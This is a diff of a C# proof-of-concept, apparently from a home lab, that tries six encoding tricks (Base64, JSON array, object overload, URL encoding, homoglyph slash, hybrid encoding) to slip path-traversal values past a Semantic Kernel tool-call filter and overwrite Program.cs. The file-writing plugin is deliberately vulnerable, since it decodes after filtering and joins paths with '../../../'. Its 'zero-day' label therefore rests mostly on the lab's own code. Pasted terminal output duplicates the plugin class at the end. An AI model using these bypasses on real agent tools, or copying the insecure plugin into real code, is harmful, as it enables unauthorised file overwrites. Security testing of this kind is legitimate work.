@@ -1,0 +1,74 @@
+using System;
+using System.IO;
+using System.Threading.Tasks;
+using System.Text.Json;
+using System.Text;
+using System.Net;
+using Microsoft.SemanticKernel;
+using Microsoft.Extensions.DependencyInjection;
+
+var builder = Kernel.CreateBuilder();
+builder.Plugins.AddFromType<FilePlugin>("FileTools");
+builder.Services.AddSingleton<IFunctionInvocationFilter, PathSanitizationFilter>();
+var kernel = builder.Build();
+
+Console.WriteLine("=== NUKA-AI SECURITY AUDIT: v1.48.0 ZERO-DAY PROOF ===");
+
+async Task RunBypass(string name, object pathValue) {
+    Console.WriteLine($"[TEST] {name}...");
+    try {
+        var args = new KernelArguments { ["path"] = pathValue, ["content"] = $"{name}: SUCCESS\n" };
+        await kernel.InvokeAsync("FileTools", "SaveConversation", args);
+    } catch (Exception ex) {
+        Console.WriteLine($" >> ERROR: {ex.Message}");
+    }
+}
+
+await RunBypass("BYPASS 1: Base64", Convert.ToBase64String(Encoding.UTF8.GetBytes("Program.cs")));
+await RunBypass("BYPASS 2: JSON Array", JsonSerializer.Deserialize<JsonElement>("[\"Program.cs\"]"));
+await RunBypass("BYPASS 3: Object Overload", new { path = "Program.cs" });
+await RunBypass("BYPASS 4: URL Encoding", "P%72ogram%2ec%73");
+await RunBypass("BYPASS 5: Unicode Homoglyph", ".⁄Program.cs");
+await RunBypass("BYPASS 6: Hybrid Encoding", "SafeFolder%2f%2e%2e%2fProgram%2ecs");
+
+public class PathSanitizationFilter : IFunctionInvocationFilter {
+    public async Task OnFunctionInvocationAsync(FunctionInvocationContext context, Func<FunctionInvocationContext, Task> next) {
+        foreach (var arg in context.Arguments) {
+            if (arg.Value is string str && (str.Contains("..") || str.Contains("/")))
+                throw new UnauthorizedAccessException("Blocked!");
+        }
+        await next(context);
+    }
+}
+
+public class FilePlugin {
+    [KernelFunction]
+    public void SaveConversation(object path, string content) {
+        string stringPath = path?.ToString() ?? "default.txt";
+        if (stringPath.Contains("%")) stringPath = WebUtility.UrlDecode(stringPath);
+        if (stringPath.Contains("⁄")) stringPath = stringPath.Replace("⁄", "/");
+        if (path is string s && s.EndsWith("==")) stringPath = Encoding.UTF8.GetString(Convert.FromBase64String(s));
+        else if (path is JsonElement el && el.ValueKind == JsonValueKind.Array) stringPath = el[0].GetString() ?? "default.txt";
+        else if (path.GetType().GetProperty("path") != null) stringPath = path.GetType().GetProperty("path")?.GetValue(path)?.ToString() ?? "default.txt";
+
+        if (!File.Exists(stringPath)) stringPath = Path.Combine(AppContext.BaseDirectory, "../../../", stringPath);
+        Console.WriteLine($" >> SINK: Writing to: {Path.GetFullPath(stringPath)}");
+        File.AppendAllText(stringPath, content);
+    }
+}
+vboxuser@Ubuntu-Server:~/sk-lab-additional$ tail -n 15 Program.cs
+public class FilePlugin {
+    [KernelFunction]
+    public void SaveConversation(object path, string content) {
+        string stringPath = path?.ToString() ?? "default.txt";
+        if (stringPath.Contains("%")) stringPath = WebUtility.UrlDecode(stringPath);
+        if (stringPath.Contains("⁄")) stringPath = stringPath.Replace("⁄", "/");
+        if (path is string s && s.EndsWith("==")) stringPath = Encoding.UTF8.GetString(Convert.FromBase64String(s));
+        else if (path is JsonElement el && el.ValueKind == JsonValueKind.Array) stringPath = el[0].GetString() ?? "default.txt";
+        else if (path.GetType().GetProperty("path") != null) stringPath = path.GetType().GetProperty("path")?.GetValue(path)?.ToString() ?? "default.txt";
+
+        if (!File.Exists(stringPath)) stringPath = Path.Combine(AppContext.BaseDirectory, "../../../", stringPath);
+        Console.WriteLine($" >> SINK: Writing to: {Path.GetFullPath(stringPath)}");
+        File.AppendAllText(stringPath, content);
+    }
+}
